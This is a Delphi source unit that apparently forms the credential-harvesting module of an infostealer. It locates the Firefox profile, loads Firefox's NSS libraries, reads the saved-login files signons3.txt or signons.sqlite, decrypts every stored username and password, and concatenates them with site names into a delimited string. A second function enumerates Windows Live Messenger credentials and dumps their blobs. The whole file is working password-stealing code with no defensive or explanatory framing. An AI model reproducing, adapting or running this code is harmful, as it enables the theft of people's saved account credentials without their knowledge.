unit uFireFox;

interface
uses windows, shfolder, cryptapi,Winsock;
Function GetFireFoxPWD:string;
function GetWindowsLiveMessengerPasswords:string;
implementation
type
  TSQLiteDB = Pointer;
  TSQLiteResult = ^PAnsiChar;
  TSQLiteStmt = Pointer;
type
  PPAnsiCharArray = ^TPAnsiCharArray;
  TPAnsiCharArray = array[0 .. (MaxInt div SizeOf(PAnsiChar))-1] of PAnsiChar;

type
  TSQLiteExecCallback = function(UserData: Pointer; NumCols: integer; ColValues:
    PPAnsiCharArray; ColNames: PPAnsiCharArray): integer; cdecl;

type
  PTChar = ^Char;
var
Db               :TSQLiteDB;
ResString        :String;
SQLite3_Open     :function(filename: PAnsiChar; var db: TSQLiteDB): integer; cdecl stdcall;
SQLite3_Close    :function(db: TSQLiteDB): integer; cdecl stdcall;
SQLite3_GetTable :function(db: TSQLiteDB; SQLStatement: PAnsiChar;
                           var ResultPtr: TSQLiteResult; var RowCount: Cardinal;
                           var ColCount: Cardinal; var ErrMsg: PAnsiChar): integer;cdecl stdcall;
SQLite3_Exec     :function(db: TSQLiteDB; SQLStatement: PAnsiChar; CallbackPtr: TSQLiteExecCallback; UserData: Pointer; var ErrMsg: PAnsiChar): integer; cdecl stdcall;
SQlite3_Free     :procedure(P: PAnsiChar); cdecl stdcall;
function ExecCallback(Sender : Pointer;
Columns                      : Integer;
ColumnValues                 : PPChar;
ColumnNames                  : PPchar): integer; cdecl;

var
   PVal, PName : PPChar;
   n           : integer;
   sVal, sName : String;

begin
   Result := 0;
         if Columns > 0 then
         begin
          PName := ColumnNames;
          PVal := ColumnValues;
            for n := 0 to Columns - 1 do
            begin
              sName := PName^;
              sVal  := PVal^;
              if sName = 'hostname' then ResString := ResString + pVal^ + #13#10;
              if sName = 'encryptedUsername' then ResString := ResString + pVal^ + #13#10;
              if sName = 'encryptedPassword' then ResString := ResString + pVal^ + #13#10 +'.' + #13#10;

               inc(PName);
               inc(PVal);
            end;

         end;
end;
function DumpData(Buffer: Pointer; BufLen: DWord): String;
var
  i, j, c: Integer;
begin
  c := 0;
Result := '';
  for i := 1 to BufLen div 16 do begin
    for j := c to c + 15 do
      if (PByte(Integer(Buffer) + j)^ < $20) or (PByte(Integer(Buffer) + j)^ > $FA) then
        Result := Result
      else
        Result := Result + PTChar(Integer(Buffer) + j)^;
    c := c + 16;
  end;
  if BufLen mod 16 <> 0 then begin
    for i := BufLen mod 16 downto 1 do begin
      if (PByte(Integer(Buffer) + Integer(BufLen) - i)^ < $20) or (PByte(Integer(Buffer) + Integer(BufLen) - i)^ > $FA) then
        Result := Result
      else
        Result := Result + PTChar(Integer(Buffer) + Integer(BufLen) - i)^;
        end;
  end;
end;

function GetWindowsLiveMessengerPasswords:string;
var
  CredentialCollection: PCREDENTIAL;
  Count, i: DWORD;
begin
  result := '';
  CredEnumerate('WindowsLive:name=*', 0, Count, CredentialCollection);
  if Count = 0 then exit;
  for I:= 0 to count -1 do begin
    result := result + '|'+  CredentialCollection[i].UserName + '#' +  Pchar(DumpData(CredentialCollection[i].CredentialBlob,CredentialCollection[i].CredentialBlobSize));
  end;
end;
Function GetSpecialFolderPath(folder : integer) : string;
const
  SHGFP_TYPE_CURRENT = 0;
var
  path: array [0..MAX_PATH] of char;
begin
  if SUCCEEDED(SHGetFolderPath(0,folder,0,SHGFP_TYPE_CURRENT,@path[0])) then
    Result := path
  else
    Result := '';
end;

Procedure Doit(S:String);
var
 utf8FileName: UTF8string;
 IResult :Integer;
 SqlRes  :TSQLiteResult;
 rCount  :Dword;
 cCount  :Dword;
 errormsg:Pchar;
Begin
     if Assigned(SQLITE3_Open) then
     Begin
    utf8FileName := UTF8String(S);
    iResult := SQLite3_Open(PAnsiChar(utf8FileName), DB);
      if iResult = 0 then
      begin
        SQLite3_GetTable(db,'SELECT * FROM moz_logins',SqlRes,rCount,cCount,errormsg);
        sqlite3_exec(DB, PChar('SELECT * FROM moz_logins'), @ExecCallback, nil, errormsg);
        sqlite3_free(errormsg);
   end;
     End;
End;
Function FileExists(Const FileName: String): Boolean;
Var
  FileData      :TWin32FindData;
  hFile         :Cardinal;
Begin
  hFile := FindFirstFile(pChar(FileName), FileData);
  If (hFile <> INVALID_HANDLE_VALUE) Then
  Begin
    Result := True;
    Windows.FindClose(hFile);
  End Else
    Result := False;
End;
Function GetFireFoxPWD:string;
type
  TSECItem = packed record
    SECItemType: dword;
    SECItemData: pchar;
    SECItemLen: dword;
  end;
  PSECItem = ^TSECItem;
var
  NSSModule: THandle;
  SQLModule: Thandle;
  NSS_Init: function(configdir: pchar): dword; cdecl;
  NSSBase64_DecodeBuffer: function(arenaOpt: pointer; outItemOpt: PSECItem; inStr: pchar; inLen: dword): dword; cdecl;
  PK11_GetInternalKeySlot: function: pointer; cdecl;
  PK11_Authenticate: function(slot: pointer; loadCerts: boolean; wincx: pointer): dword; cdecl;
  PK11SDR_Decrypt: function(data: PSECItem; result: PSECItem; cx: pointer): dword; cdecl;
  NSS_Shutdown: procedure; cdecl;
  PK11_FreeSlot: procedure(slot: pointer); cdecl;
  UserenvModule: THandle;
  GetUserProfileDirectory: function(hToken: THandle; lpProfileDir: pchar; var lpcchSize: dword): longbool; stdcall;
  hToken: THandle;
  FirefoxProfilePath: pchar;
  MainProfile: array [0..MAX_PATH] of char;
  MainProfilePath: pchar;
  PasswordFile: THandle;
  PasswordFileSize: dword;
  PasswordFileData: pchar;
  Passwords: string;
  BytesRead: dword;
  CurrentEntry: string;
  Site: string;
  Name: string;
  Value: string;
  KeySlot: pointer;
  EncryptedSECItem: TSECItem;
  DecryptedSECItem: TSECItem;
  Res: string;
  ResTrunk:String;
 SqlDb   :String;
begin
  ResString := '';
  LoadLibrary(pchar(GetSpecialFolderPath(CSIDL_PROGRAM_FILES) + '\Mozilla Firefox\' + 'mozcrt19.dll'));
  LoadLibrary(pchar(GetSpecialFolderPath(CSIDL_PROGRAM_FILES) + '\Mozilla Firefox\' + 'sqlite3.dll'));
  LoadLibrary(pchar(GetSpecialFolderPath(CSIDL_PROGRAM_FILES) + '\Mozilla Firefox\' + 'nspr4.dll'));
  LoadLibrary(pchar(GetSpecialFolderPath(CSIDL_PROGRAM_FILES) + '\Mozilla Firefox\' + 'plc4.dll'));
  LoadLibrary(pchar(GetSpecialFolderPath(CSIDL_PROGRAM_FILES) + '\Mozilla Firefox\' + 'plds4.dll'));
  LoadLibrary(pchar(GetSpecialFolderPath(CSIDL_PROGRAM_FILES) + '\Mozilla Firefox\' + 'nssutil3.dll'));
  LoadLibrary(pchar(GetSpecialFolderPath(CSIDL_PROGRAM_FILES) + '\Mozilla Firefox\' + 'softokn3.dll'));
  NSSModule := LoadLibrary(pchar(GetSpecialFolderPath(CSIDL_PROGRAM_FILES) + '\Mozilla Firefox\' + 'nss3.dll'));
  @NSS_Init := GetProcAddress(NSSModule, 'NSS_Init');
  @NSSBase64_DecodeBuffer := GetProcAddress(NSSModule, 'NSSBase64_DecodeBuffer');
  @PK11_GetInternalKeySlot := GetProcAddress(NSSModule, 'PK11_GetInternalKeySlot');
  @PK11_Authenticate := GetProcAddress(NSSModule, 'PK11_Authenticate');
  @PK11SDR_Decrypt := GetProcAddress(NSSModule, 'PK11SDR_Decrypt');
  @NSS_Shutdown := GetProcAddress(NSSModule, 'NSS_Shutdown');
  @PK11_FreeSlot := GetProcAddress(NSSModule, 'PK11_FreeSlot');
  UserenvModule := LoadLibrary('userenv.dll');
  @GetUserProfileDirectory := GetProcAddress(UserenvModule, 'GetUserProfileDirectoryA');
  if fileexists(GetSpecialFolderPath(CSIDL_PROGRAM_FILES) + '\Mozilla Firefox\' + 'sqlite3.dll') = false then exit;
  SQLMOdule       :=  LoadLibrary(pchar(GetSpecialFolderPath(CSIDL_PROGRAM_FILES) + '\Mozilla Firefox\' + 'sqlite3.dll'));
  @SQLite3_Open    := GetProcAddress(SQLModule,'sqlite3_open');
  @SQLite3_Close   := GetProcAddress(SQLModule,'sqlite3_close');
  @SQLite3_GetTable:= GetProcAddress(SQLModule,'sqlite3_get_table');
  @SQLite3_Exec    := GetProcAddress(SQLModule,'sqlite3_exec');
  @SQlite3_Free    := GetProcAddress(SQLModule,'sqlite3_free');

  OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, hToken);
  FirefoxProfilePath := pchar(GetSpecialFolderPath(CSIDL_APPDATA) + '\Mozilla\Firefox\'  + 'profiles.ini');
  GetPrivateProfileString('Profile0', 'Path', '', MainProfile, MAX_PATH, FirefoxProfilePath);
  MainProfilePath := pchar(GetSpecialFolderPath(CSIDL_APPDATA) + '\Mozilla\Firefox\' + MainProfile  + '\signons3.txt');

  PasswordFile := CreateFile(MainProfilePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  PasswordFileSize := GetFileSize(PasswordFile, nil);
  GetMem(PasswordFileData, PasswordFileSize);
  ReadFile(PasswordFile, PasswordFileData^, PasswordFileSize, BytesRead, nil);
  CloseHandle(PasswordFile);
  Passwords := PasswordFileData;
  FreeMem(PasswordFileData);
  Delete(Passwords, 1, Pos('.' + #13#10, Passwords) + 2);
  
  if Length(Passwords) <=0 then
  begin
     SqlDb := GetSpecialFolderPath(CSIDL_APPDATA) + '\Mozilla\Firefox\' + MainProfile  + '\signons.sqlite';
     Doit(SqlDb);
     Passwords := ResString;
  end;

  if NSS_Init(pchar(GetSpecialFolderPath(CSIDL_APPDATA) + '\Mozilla\Firefox\'  +  MainProfile)) = 0 then

  begin
    KeySlot := PK11_GetInternalKeySlot;
    if KeySlot <> nil then
    begin
      if PK11_Authenticate(KeySlot, True, nil) = 0 then
      begin
        while Length(Passwords) <> 0 do
        begin
          CurrentEntry := Copy(Passwords, 1, Pos('.' + #13#10, Passwords) - 1);
          Delete(Passwords, 1, Length(CurrentEntry) + 3);
          Site := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
          Delete(CurrentEntry, 1, Length(Site) + 2);
          ResTrunk := ResTrunk + '|'+ Site ;
          while Length(CurrentEntry) <> 0 do
          begin
            Name := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
            Delete(CurrentEntry, 1, Length(Name) + 2);
            
            NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Name), Length(Name));
            if PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil) = 0 then
            begin
              Res := DecryptedSECItem.SECItemData;
              SetLength(Res, DecryptedSECItem.SECItemLen);
              if Length(Name) = 0 then Name := '(unnamed value)';
              ResTrunk := ResTrunk + '#' + Res;
            end;

            Value := Copy(CurrentEntry, 1, Pos(#13#10, CurrentEntry) - 1);
            Delete(CurrentEntry, 1, Length(Value) + 2);
            NSSBase64_DecodeBuffer(nil, @EncryptedSECItem, pchar(Value), Length(Value));
            if PK11SDR_Decrypt(@EncryptedSECItem, @DecryptedSECItem, nil) = 0 then
            begin
              Res := DecryptedSECItem.SECItemData;
              SetLength(Res, DecryptedSECItem.SECItemLen);
              if Length(Name) = 0 then Name := '(unnamed value)';
              ResTrunk := ResTrunk + '#' +  Res

                 end
            else
            begin

            end
          end;

        end;
      end
      else
      begin

      end;
      PK11_FreeSlot(KeySlot);
    end
    else
    begin

    end;
    NSS_Shutdown;
  end
  else
  begin
  end;
  Result := Pchar(ResTrunk);
end;

end.
 
